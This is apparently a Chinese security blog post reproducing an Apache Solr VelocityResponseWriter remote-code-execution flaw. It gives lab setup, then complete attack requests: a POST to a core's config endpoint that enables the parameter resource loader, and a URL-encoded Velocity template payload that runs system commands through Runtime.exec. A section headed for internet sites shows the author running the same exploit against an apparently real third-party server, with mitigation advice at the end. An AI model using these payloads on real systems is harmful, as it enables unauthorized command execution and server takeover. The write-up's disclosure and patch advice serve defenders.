原创：Mature合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 0x00 前言  

今天在群里看到有人说GitHub上公布了一个关于solr的RCE漏洞,于是立马复现了一波!确定该poc是真实有效的。

## solr简介:  

Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http
Get操作提出查找请求，并得到XML格式的返回结果。

## 0x01 漏洞详情  

该漏洞的产生原因：

  1. 攻击者可以直接访问solr admin页面,并可以通过构造post请求来修改节点的配置.  

  2. Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。  

当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的请求，在服务器上进行命令执行,从而获取服务器的权限。

关于params.resource.loader.enabled的介绍:

![v2-62802551b1850855aeeab0aff45fcb23_hd.p](https://pic1.zhimg.com/80/v2-62802551b1850855aeeab0aff45fcb23_hd.png)

https://lucene.apache.org/solr/guide/6_6/velocity-response-writer.html

中文版的:

![v2-0ac310d480e20115b6d7f86933fe8bda_hd.p](https://pic3.zhimg.com/80/v2-0ac310d480e20115b6d7f86933fe8bda_hd.png)

https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html

## 0x02 影响范围:  

应该是影响solr5(暂不确定)到最新版本.

## 0x03 环境搭建:  

## 环境情况:  

solr版本: solr8.2.0

操作系统:windows

## 搭建步骤:  

  1. 下载漏洞范围影响范围内的solr,我这里使用最新版的8.2.0 (solr启动需要java环境的支持,所以要提前安装好java)  

  2. 解压下载的solr,然后进入到solr的bin目录下,执行以下命令启动solr:  

solr start -p 8983

可以看到显示已经启动:

![v2-76c8a73ca140489275bfb98bddaa2f2f_hd.p](https://pic2.zhimg.com/80/v2-76c8a73ca140489275bfb98bddaa2f2f_hd.png)

  1. 浏览器访问验证下:  

![v2-b803271eeb71868f3af20984651583fe_hd.p](https://pic1.zhimg.com/80/v2-b803271eeb71868f3af20984651583fe_hd.png)

  1. 创建一个core,可以在网页创建,也可以在命令行下创建.  

这里演示下在命令行创建:

![v2-758a7912aa0acc865ab8ee9b76ec0c53_hd.p](https://pic3.zhimg.com/80/v2-758a7912aa0acc865ab8ee9b76ec0c53_hd.png)

可以看到成功创建.

网页创建core可参考:

<https://blog.csdn.net/weixin_39082031/article/details/78924909>

  1. 访问验证我们的core是否创建成功:  

![v2-500f3255ca03ad8a8ec161de9aacca00_hd.p](https://pic1.zhimg.com/80/v2-500f3255ca03ad8a8ec161de9aacca00_hd.png)

可以看到已经成功创建!

## 0x04 漏洞复现:  

## 本地复现:  

  1. 访问solr站点:  

![v2-4d95c04991650f4562011ba08552105a_hd.p](https://pic2.zhimg.com/80/v2-4d95c04991650f4562011ba08552105a_hd.png)

获取到其core名为test.

  1. 访问该core的config路径,查看其配置,并搜索params.resource.loader.enabled参数:  

![v2-0ae4e8410cf960e950b5764ca8ca9dce_hd.p](https://pic3.zhimg.com/80/v2-0ae4e8410cf960e950b5764ca8ca9dce_hd.png)

可以看到其默认是关闭的.

  1. 我们可以通过构造POST数据包来开启params.resource.loader.enabled  

POST数据包:

POST /solr/test/config HTTP/1.1 Host: 172.26.1.173:8983 User-Agent:
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3 Content-Type:
application/json Accept-Encoding: gzip, deflate Connection: close Content-Length: 259 { "update-queryresponsewriter": { "startup": "lazy", "name":
"velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "",
"solr.resource.loader.enabled": "true", "params.resource.loader.enabled":
"true" } }

示例:

![v2-547b513d5e2357e054a707c2241a02f2_hd.p](https://pic2.zhimg.com/80/v2-547b513d5e2357e054a707c2241a02f2_hd.png)

可以看到响应包.说会在未来改变(也就是我们修改的配置一会会生效)

  1. 我们重新访问:  

![v2-931338fa2b0a16b2f7adf4542d7ed3e3_hd.p](https://pic4.zhimg.com/80/v2-931338fa2b0a16b2f7adf4542d7ed3e3_hd.png)

可以看到我们构造的请求已经成功开启了params.resource.loader.enabled

  1. 利用GitHub上的payload进行命令执行:  

select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

我们靶机为windows所以修改id为windows下的命令:

![v2-aa6bb702f982aff4b7fd8cec276caaf1_hd.p](https://pic3.zhimg.com/80/v2-aa6bb702f982aff4b7fd8cec276caaf1_hd.png)

## 互联网站点:  

找一个目标:

  1. 获取该solr的节点名:  

![v2-03aec0d4b1ed9e3be64ac1baa597c1aa_hd.p](https://pic2.zhimg.com/80/v2-03aec0d4b1ed9e3be64ac1baa597c1aa_hd.png)

  1. 进入到该节点的config:  

![v2-302fb53a3b2f62272798081a8c5c226b_hd.p](https://pic4.zhimg.com/80/v2-302fb53a3b2f62272798081a8c5c226b_hd.png)

  1. ctrl + f 搜索params.resource.loader.enabled 若该参数对应的值为true 即存在该漏洞!  

若对应的值为false,则可以通过发送post包来将其修改为true!

POST数据包:

POST /solr/获取到的节点名/config HTTP/1.1 Host: solr:8983 Content-Type:
application/json Content-Length: 259 { "update-queryresponsewriter": {
"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter",
"template.base.dir": "", "solr.resource.loader.enabled": "true",
"params.resource.loader.enabled": "true" } }

该参数为true后,直接使用GitHub上的poc:

select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

  1. 直接get请求:  

![v2-c913141b6ddb3cebdac5cbbdd851a435_hd.p](https://pic4.zhimg.com/80/v2-c913141b6ddb3cebdac5cbbdd851a435_hd.png)

## 0x04 漏洞修复:  

1、官方还暂未发布该漏洞的相关补丁,建议用户设置solr后台为登陆认证!!!

​ 限制互联网用户对solr admin的访问!

2、删除params.resource.loader.enabled的配置。

3、时刻关注solr官方,出现新版本要赶快更新

## 0x05 参考链接:  

<https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133>

<https://mp.weixin.qq.com/s/RWG7nxwCMtlyPnookXlaLA>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

